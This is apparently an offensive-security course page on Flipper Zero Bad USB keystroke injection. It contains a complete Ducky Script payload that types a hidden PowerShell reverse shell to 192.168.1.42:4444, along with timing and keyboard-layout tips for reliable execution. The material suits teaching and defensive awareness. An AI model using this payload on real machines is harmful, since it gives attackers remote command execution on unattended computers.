Phase 5 — Bad USB (HID injection)

Plug Flipper into USB port. Host trusts keyboards. Flipper types the payload. The oldest reliable category of physical-access attacks, in visual form.

1. The premise — why HID injection works

USB Human Interface Device protocol. Every modern OS auto-loads HID drivers without user prompts. A keyboard plugged in is, by design, immediately able to type into whatever window has focus.

unattended computer + 5–10 second physical access
The fundamental asymmetry: the OS cannot distinguish a real keyboard from a typing-fast injector. There is no "user clicked confirm" prompt because keyboards are too common to gate. Mitigation must happen at policy (port disable, allowlist, EDR), not at the USB-HID layer.

2. Ducky Script — annotated payload

A real (sanitized) Windows reverse-shell payload. Click any block to see what each line does and why the timing matters.

REM Stage 1 — open RUN, launch PowerShell reverse shell
REM Lab-only; canonical payload, AV catches on default Windows

DELAY 1000                    ← let host settle after USB enumerate
GUI r                         ← Windows-key + R → opens RUN dialog
DELAY 500                     ← RUN takes ~300ms to appear
STRING powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('192.168.1.42',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String );$rb=([text.encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()"
ENTER                         ← submit; powershell launches hidden, connects out

Why each delay exists

  • DELAY 1000 at top: USB enumeration is async. The script starts as soon as the Flipper firmware boots Bad USB mode, but the host hasn't finished mounting the keyboard yet. First 50–500ms of keystrokes can be lost.
  • DELAY 500 after GUI r: the RUN dialog needs a window-paint cycle. Without this, the first characters of "powershell" land in the focused parent window (often Explorer) instead.
  • No DELAY between STRING and ENTER: safe because STRING completes synchronously. Adding DELAY here is harmless padding.

First version: pad delays generously. Trim them only after the payload reliably works.

5. Keyboard layout footgun — same script, different output

The most common Bad USB failure: payload typed under a non-US layout produces garbage. The Flipper sends scan codes; the OS maps them to characters per the active layout.

Each row shows what the host sees on a different layout.
OS keyboard layoutWhat gets typedNotes
Mitigation: always put KEYBOARD_LAYOUT US at the top of every script. The Flipper firmware then sends layout-aware scan codes — but only if both the script and the target are aligned. Best practice for engagements where target layout is unknown: use payloads that avoid problem characters (no /, \, @, &) and use Base64-encoded inner commands.
The deep version of the problem

USB HID sends "key code 0x35 pressed" — the keyboard's physical position. The OS layout driver maps that position to a character. On US-QWERTY, 0x35 = backtick `. On AZERTY, 0x35 = ². Same key code, different character. Bad USB tools assume the target is US-QWERTY because most are; when they aren't, the symbol-heavy payloads (PowerShell, bash) break catastrophically.
